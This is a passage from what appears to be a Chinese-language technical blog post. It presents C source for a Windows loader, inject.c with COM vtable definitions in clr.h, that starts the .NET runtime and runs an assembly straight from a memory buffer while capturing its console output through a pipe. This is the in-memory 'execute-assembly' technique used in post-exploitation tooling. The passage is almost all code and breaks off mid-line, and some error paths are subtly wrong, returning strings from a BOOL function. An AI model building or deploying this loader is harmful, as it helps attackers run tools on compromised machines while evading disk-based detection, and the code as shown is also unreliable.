DUMMY_METHOD(GetLifetimeService);</span><br><span class="line">    DUMMY_METHOD(Evidence);</span><br><span class="line">    DUMMY_METHOD(add_DomainUnload);</span><br><span class="line">    DUMMY_METHOD(remove_DomainUnload);</span><br><span class="line">    DUMMY_METHOD(add_AssemblyLoad);</span><br><span class="line">    DUMMY_METHOD(remove_AssemblyLoad);</span><br><span class="line">    DUMMY_METHOD(add_ProcessExit);</span><br><span class="line">    DUMMY_METHOD(remove_ProcessExit);</span><br><span class="line">    DUMMY_METHOD(add_TypeResolve);</span><br><span class="line">    DUMMY_METHOD(remove_TypeResolve);</span><br><span class="line">    DUMMY_METHOD(add_ResourceResolve);</span><br><span class="line">    DUMMY_METHOD(remove_ResourceResolve);</span><br><span class="line">    DUMMY_METHOD(add_AssemblyResolve);</span><br><span class="line">    DUMMY_METHOD(remove_AssemblyResolve);</span><br><span class="line">    DUMMY_METHOD(add_UnhandledException);</span><br><span class="line">    DUMMY_METHOD(remove_UnhandledException);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_2);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_3);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_4);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_5);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_6);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_7);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_8);</span><br><span class="line">    DUMMY_METHOD(DefineDynamicAssembly_9);</span><br><span class="line">    DUMMY_METHOD(CreateInstance);</span><br><span class="line">    DUMMY_METHOD(CreateInstanceFrom);</span><br><span class="line">    DUMMY_METHOD(CreateInstance_2);</span><br><span class="line">    DUMMY_METHOD(CreateInstanceFrom_2);</span><br><span class="line">    DUMMY_METHOD(CreateInstance_3);</span><br><span class="line">    DUMMY_METHOD(CreateInstanceFrom_3);</span><br><span class="line">    DUMMY_METHOD(Load);</span><br><span class="line">    DUMMY_METHOD(Load_2);</span><br><span class="line">    <span class="comment">// 关键: Load_3</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* Load_3)(IAppDomain* This, SAFEARRAY* rawAssembly, IAssembly** pRetVal);</span><br><span class="line">    <span class="comment">// ... 后面忽略，反正用不到，只要 Load_3 位置对就行</span></span><br><span class="line">&#125; AppDomainVtbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> _AppDomain &#123; AppDomainVtbl* lpVtbl; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. IAssembly</span></span><br><span class="line">typedef <span class="keyword">struct</span> _AssemblyVtbl &#123;</span><br><span class="line">    <span class="comment">// IUnknown</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IAssembly* This, REFIID riid, void** ppvObject);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* AddRef)(IAssembly* This);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* Release)(IAssembly* This);</span><br><span class="line">    <span class="comment">// IDispatch</span></span><br><span class="line">    DUMMY_METHOD(GetTypeInfoCount);</span><br><span class="line">    DUMMY_METHOD(GetTypeInfo);</span><br><span class="line">    DUMMY_METHOD(GetIDsOfNames);</span><br><span class="line">    DUMMY_METHOD(Invoke);</span><br><span class="line">    <span class="comment">// _Assembly</span></span><br><span class="line">    DUMMY_METHOD(ToString);</span><br><span class="line">    DUMMY_METHOD(Equals);</span><br><span class="line">    DUMMY_METHOD(GetHashCode);</span><br><span class="line">    DUMMY_METHOD(GetType);</span><br><span class="line">    DUMMY_METHOD(CodeBase);</span><br><span class="line">    DUMMY_METHOD(EscapedCodeBase);</span><br><span class="line">    DUMMY_METHOD(GetName);</span><br><span class="line">    DUMMY_METHOD(GetName_2);</span><br><span class="line">    DUMMY_METHOD(FullName);</span><br><span class="line">    <span class="comment">// 关键: EntryPoint</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* EntryPoint)(IAssembly* This, IMethodInfo** pRetVal);</span><br><span class="line">&#125; AssemblyVtbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> _Assembly &#123; AssemblyVtbl* lpVtbl; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. IMethodInfo</span></span><br><span class="line">typedef <span class="keyword">struct</span> _MethodInfoVtbl &#123;</span><br><span class="line">    <span class="comment">// IUnknown</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IMethodInfo* This, REFIID riid, void** ppvObject);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* AddRef)(IMethodInfo* This);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* Release)(IMethodInfo* This);</span><br><span class="line">    <span class="comment">// IDispatch</span></span><br><span class="line">    DUMMY_METHOD(GetTypeInfoCount);</span><br><span class="line">    DUMMY_METHOD(GetTypeInfo);</span><br><span class="line">    DUMMY_METHOD(GetIDsOfNames);</span><br><span class="line">    DUMMY_METHOD(Invoke);</span><br><span class="line">    <span class="comment">// _MethodBase / _MethodInfo</span></span><br><span class="line">    DUMMY_METHOD(ToString);</span><br><span class="line">    DUMMY_METHOD(Equals);</span><br><span class="line">    DUMMY_METHOD(GetHashCode);</span><br><span class="line">    DUMMY_METHOD(GetType);</span><br><span class="line">    DUMMY_METHOD(MemberType);</span><br><span class="line">    DUMMY_METHOD(name);</span><br><span class="line">    DUMMY_METHOD(DeclaringType);</span><br><span class="line">    DUMMY_METHOD(ReflectedType);</span><br><span class="line">    DUMMY_METHOD(GetCustomAttributes);</span><br><span class="line">    DUMMY_METHOD(GetCustomAttributes_2);</span><br><span class="line">    DUMMY_METHOD(IsDefined);</span><br><span class="line">    DUMMY_METHOD(GetParameters);</span><br><span class="line">    DUMMY_METHOD(GetMethodImplementationFlags);</span><br><span class="line">    DUMMY_METHOD(MethodHandle);</span><br><span class="line">    DUMMY_METHOD(Attributes);</span><br><span class="line">    DUMMY_METHOD(CallingConvention);</span><br><span class="line">    DUMMY_METHOD(Invoke_2);</span><br><span class="line">    DUMMY_METHOD(IsPublic);</span><br><span class="line">    DUMMY_METHOD(IsPrivate);</span><br><span class="line">    DUMMY_METHOD(IsFamily);</span><br><span class="line">    DUMMY_METHOD(IsAssembly);</span><br><span class="line">    DUMMY_METHOD(IsFamilyAndAssembly);</span><br><span class="line">    DUMMY_METHOD(IsFamilyOrAssembly);</span><br><span class="line">    DUMMY_METHOD(IsStatic);</span><br><span class="line">    DUMMY_METHOD(IsFinal);</span><br><span class="line">    DUMMY_METHOD(IsVirtual);</span><br><span class="line">    DUMMY_METHOD(IsHideBySig);</span><br><span class="line">    DUMMY_METHOD(IsAbstract);</span><br><span class="line">    DUMMY_METHOD(IsSpecialName);</span><br><span class="line">    DUMMY_METHOD(IsConstructor);</span><br><span class="line">    <span class="comment">// 关键: Invoke_3</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* Invoke_3)(IMethodInfo* This, VARIANT obj, SAFEARRAY* parameters, VARIANT* ret);</span><br><span class="line">&#125; MethodInfoVtbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> _MethodInfo &#123; MethodInfoVtbl* lpVtbl; &#125;;</span><br><span class="line"></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+<p><strong>inject.c</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;clr.h&quot;</span></span><br><span class="line">#include &lt;winhttp.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#pragma comment(lib, <span class="string">&quot;winhttp.lib&quot;</span>)</span><br><span class="line">#pragma comment(lib, <span class="string">&quot;user32.lib&quot;</span>)</span><br><span class="line">#pragma comment(lib, <span class="string">&quot;oleaut32.lib&quot;</span>)</span><br><span class="line"></span><br><span class="line">#define SAFE_CLOSE(h)   &#123; <span class="keyword">if</span> (h &amp;&amp; h != INVALID_HANDLE_VALUE) &#123; CloseHandle(h); h = NULL; &#125; &#125;</span><br><span class="line">#define SAFE_RELEASE(p) &#123; <span class="keyword">if</span> (p) &#123; (p)-&gt;lpVtbl-&gt;Release(p); (p) = NULL; &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">HANDLE g_OrigninalStdOut = INVALID_HANDLE_VALUE;</span><br><span class="line">HANDLE g_OrigninalStdErr = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GUID 定义 (Pure C)</span></span><br><span class="line"><span class="keyword">const</span> GUID xCLSID_CLRMetaHost = &#123; <span class="number">0x9280188d</span>, <span class="number">0xe8e</span>,  <span class="number">0x4867</span>, &#123; <span class="number">0xb3</span>, <span class="number">0xc</span>,  <span class="number">0x7f</span>, <span class="number">0xa8</span>, <span class="number">0x38</span>, <span class="number">0x84</span>, <span class="number">0xe8</span>, <span class="number">0xde</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">const</span> GUID xCLSID_CorRuntimeHost = &#123; <span class="number">0xcb2f6723</span>, <span class="number">0xab3a</span>, <span class="number">0x11d2</span>, &#123; <span class="number">0x9c</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0xc0</span>, <span class="number">0x4f</span>, <span class="number">0xa3</span>, <span class="number">0x0a</span>, <span class="number">0x3e</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">const</span> GUID xIID_AppDomain = &#123; <span class="number">0x05F696DC</span>, <span class="number">0x2B29</span>, <span class="number">0x3663</span>, &#123; <span class="number">0xAD</span>, <span class="number">0x8B</span>, <span class="number">0xC4</span>, <span class="number">0x38</span>, <span class="number">0x9C</span>, <span class="number">0xF2</span>, <span class="number">0xA7</span>, <span class="number">0x13</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">const</span> GUID xIID_ICLRMetaHost = &#123; <span class="number">0xD332DB9E</span>, <span class="number">0xB9B3</span>, <span class="number">0x4125</span>, &#123; <span class="number">0x82</span>, <span class="number">0x07</span>, <span class="number">0xA1</span>, <span class="number">0x48</span>, <span class="number">0x84</span>, <span class="number">0xF5</span>, <span class="number">0x32</span>, <span class="number">0x16</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">const</span> GUID xIID_ICLRRuntimeInfo = &#123; <span class="number">0xBD39D1D2</span>, <span class="number">0xBA2F</span>, <span class="number">0x486a</span>, &#123; <span class="number">0x89</span>, <span class="number">0xB0</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0xCB</span>, <span class="number">0x46</span>, <span class="number">0x68</span>, <span class="number">0x91</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">const</span> GUID xIID_ICorRuntimeHost = &#123; <span class="number">0xcb2f6722</span>, <span class="number">0xab3a</span>, <span class="number">0x11d2</span>, &#123; <span class="number">0x9c</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0xc0</span>, <span class="number">0x4f</span>, <span class="number">0xa3</span>, <span class="number">0x0a</span>, <span class="number">0x3e</span> &#125; &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 线程函数：专门负责从管道中读取数据</span></span><br><span class="line"><span class="comment">// 符合 Windows API 线程签名: DWORD WINAPI Function(LPVOID)</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line">DWORD WINAPI PipeReaderThread(LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1. 获取上下文</span></span><br><span class="line">    PipeContext* ctx = (PipeContext*)lpParam;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="type">int</span> BUFSIZE = <span class="number">4096</span>;</span><br><span class="line">    char buffer[<span class="number">4096</span>]; <span class="comment">// 栈上的临时缓冲区</span></span><br><span class="line">    DWORD bytesRead = <span class="number">0</span>;</span><br><span class="line">    BOOL bSuccess = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化输出</span></span><br><span class="line">    ctx-&gt;outputBuffer = NULL;</span><br><span class="line">    ctx-&gt;totalBytes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 循环读取</span></span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 阻塞读取</span></span><br><span class="line">        bSuccess = ReadFile(ctx-&gt;hPipeRead, buffer, BUFSIZE, &amp;bytesRead, NULL);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 管道断开或无数据则退出</span></span><br><span class="line">        <span class="keyword">if</span> (!bSuccess || bytesRead == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 动态扩展内存 (模拟 string.append)</span></span><br><span class="line">        <span class="comment">// 新大小 = 旧大小 + 本次读取大小 + 1 (为了最后的 \0)</span></span><br><span class="line">        char* newPtr = (char*)realloc(ctx-&gt;outputBuffer, ctx-&gt;totalBytes + bytesRead + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (newPtr == NULL) &#123;</span><br><span class="line">            <span class="comment">// 内存分配失败处理</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx-&gt;outputBuffer = newPtr;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 复制数据</span></span><br><span class="line">        <span class="comment">// memcpy(目标位置, 源数据, 数据长度)</span></span><br><span class="line">        memcpy(ctx-&gt;outputBuffer + ctx-&gt;totalBytes, buffer, bytesRead);</span><br><span class="line"></span><br><span class="line">        ctx-&gt;totalBytes += bytesRead;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 加上 Null 结尾，方便把它当字符串打印</span></span><br><span class="line">        ctx-&gt;outputBuffer[ctx-&gt;totalBytes] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL DotnetExecute(BUFFER Assembly, BUFFER Arguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 变量定义</span></span><br><span class="line">    PICLRMetaHost       pMetaHost = NULL;</span><br><span class="line">    PICLRRuntimeInfo    pRuntimeInfo = NULL;</span><br><span class="line">    PICorRuntimeHost    pCorRuntimeHost = NULL;</span><br><span class="line">    IUnknown* pAppDomainThunk = NULL;</span><br><span class="line">    IAppDomain* pAppDomain = NULL;</span><br><span class="line">    IAssembly* pAssembly = NULL;</span><br><span class="line">    IMethodInfo* pMethodInfo = NULL;</span><br><span class="line"></span><br><span class="line">    SAFEARRAY* pSafeArray = NULL;</span><br><span class="line">    SAFEARRAY* pMethodArgs = NULL;</span><br><span class="line">    SAFEARRAYBOUND      RgsBound[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    void* pData = NULL;</span><br><span class="line"></span><br><span class="line">    VARIANT             vObj;</span><br><span class="line">    VARIANT             vRet;</span><br><span class="line">    VARIANT             vPsa;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 VARIANT</span></span><br><span class="line">    VariantInit(&amp;vObj);</span><br><span class="line">    VariantInit(&amp;vRet);</span><br><span class="line">    VariantInit(&amp;vPsa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态加载变量</span></span><br><span class="line">    HMODULE hMscoree = NULL;</span><br><span class="line">    CLRCreateInstanceFnPtr pfnCLRCreateInstance = NULL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Assembly.Buffer || !Assembly.Length) &#123;</span><br><span class="line">		printf(<span class="string">&quot;[-] Invalid Assembly buffer.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;[*] Starting DotnetExecute (Pure C Mode)...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">	<span class="comment">// 1. 创建匿名管道，重定向 StdOut/StdErr</span></span><br><span class="line">    <span class="comment">// ========================================== </span></span><br><span class="line">    SECURITY_ATTRIBUTES saAttr;</span><br><span class="line">    HANDLE hPipeRead = NULL;</span><br><span class="line">    HANDLE hPipeWrite = NULL;</span><br><span class="line">    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);</span><br><span class="line">    saAttr.bInheritHandle = TRUE; <span class="comment">// 允许句柄被继承/使用</span></span><br><span class="line">    saAttr.lpSecurityDescriptor = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!CreatePipe(&amp;hPipeRead, &amp;hPipeWrite, &amp;saAttr, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: CreatePipe failed\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存原始 StdOut/StdErr</span></span><br><span class="line">    g_OrigninalStdOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    g_OrigninalStdErr = GetStdHandle(STD_ERROR_HANDLE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重定向 StdOut/StdErr 到管道写入端</span></span><br><span class="line">    <span class="keyword">if</span> (!SetStdHandle(STD_OUTPUT_HANDLE, hPipeWrite) || !SetStdHandle(STD_ERROR_HANDLE, hPipeWrite)) &#123;</span><br><span class="line">        CloseHandle(hPipeRead);</span><br><span class="line">        CloseHandle(hPipeWrite);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: SetStdHandle failed\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 准备上下文，创建线程 ---</span></span><br><span class="line">    PipeContext ctx;</span><br><span class="line">    ctx.hPipeRead = hPipeRead;</span><br><span class="line">    ctx.outputBuffer = NULL;</span><br><span class="line">    ctx.totalBytes = <span class="number">0</span>;</span><br><span class="line">    HANDLE hThread = CreateThread(</span><br><span class="line">        NULL,                   <span class="comment">// 默认安全属性</span></span><br><span class="line">        <span class="number">0</span>,                      <span class="comment">// 默认堆栈大小</span></span><br><span class="line">        PipeReaderThread,       <span class="comment">// 线程函数</span></span><br><span class="line">        &amp;ctx,                   <span class="comment">// 传递结构体指针</span></span><br><span class="line">        <span class="number">0</span>,                      <span class="comment">// 立即启动</span></span><br><span class="line">        NULL                    <span class="comment">// 不通过 ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// 2. 初始化 CLR 环境 (C 语言动态调用)</span></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    HRESULT hr = S_OK;</span><br><span class="line">    hMscoree = LoadLibraryA(<span class="string">&quot;mscoree.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hMscoree) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 CLRCreateInstance: 这是入口函数</span></span><br><span class="line">    pfnCLRCreateInstance = (CLRCreateInstanceFnPtr)GetProcAddress(hMscoree, <span class="string">&quot;CLRCreateInstance&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pfnCLRCreateInstance) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 CLRCreateInstance</span></span><br><span class="line">    hr = pfnCLRCreateInstance(&amp;xCLSID_CLRMetaHost, &amp;xIID_ICLRMetaHost, (void**)&amp;pMetaHost);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载运行时</span></span><br><span class="line">    hr = pMetaHost-&gt;lpVtbl-&gt;GetRuntime(pMetaHost, L<span class="string">&quot;v4.0.30319&quot;</span>, &amp;xIID_ICLRRuntimeInfo, (void**)&amp;pRuntimeInfo);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    hr = pRuntimeInfo-&gt;lpVtbl-&gt;GetInterface(pRuntimeInfo, &amp;xCLSID_CorRuntimeHost, &amp;xIID_ICorRuntimeHost, (void**)&amp;pCorRuntimeHost);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动 CLR</span></span><br><span class="line">    pCorRuntimeHost-&gt;lpVtbl-&gt;Start(pCorRuntimeHost);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 DefaultDomain</span></span><br><span class="line">    pCorRuntimeHost-&gt;lpVtbl-&gt;GetDefaultDomain(pCorRuntimeHost, (IUnknown**)&amp;pAppDomainThunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// QueryInterface 获取 IAppDomain</span></span><br><span class="line">    pAppDomainThunk-&gt;lpVtbl-&gt;QueryInterface(pAppDomainThunk, &amp;xIID_AppDomain, (void**)&amp;pAppDomain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// 3. 加载 Assembly</span></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    RgsBound[<span class="number">0</span>].cElements = Assembly.Length;</span><br><span class="line">    RgsBound[<span class="number">0</span>].lLbound = <span class="number">0</span>;</span><br><span class="line">    pSafeArray = SafeArrayCreate(VT_UI1, <span class="number">1</span>, RgsBound);</span><br><span class="line"></span><br><span class="line">    SafeArrayAccessData(pSafeArray, &amp;pData);</span><br><span class="line">    memcpy(pData, Assembly.Buffer, Assembly.Length);</span><br><span class="line">    SafeArrayUnaccessData(pSafeArray);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 Load_3</span></span><br><span class="line">    hr = pAppDomain-&gt;lpVtbl-&gt;Load_3(pAppDomain, pSafeArray, &amp;pAssembly);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 EntryPoint</span></span><br><span class="line">    hr = pAssembly-&gt;lpVtbl-&gt;EntryPoint(pAssembly, &amp;pMethodInfo);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// 4. 执行</span></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">	long idx = <span class="number">0</span>;</span><br><span class="line">    pMethodArgs = SafeArrayCreateVector(VT_VARIANT, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    vPsa.vt = (VT_ARRAY | VT_BSTR);</span><br><span class="line">    vPsa.parray = SafeArrayCreateVector(VT_BSTR, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 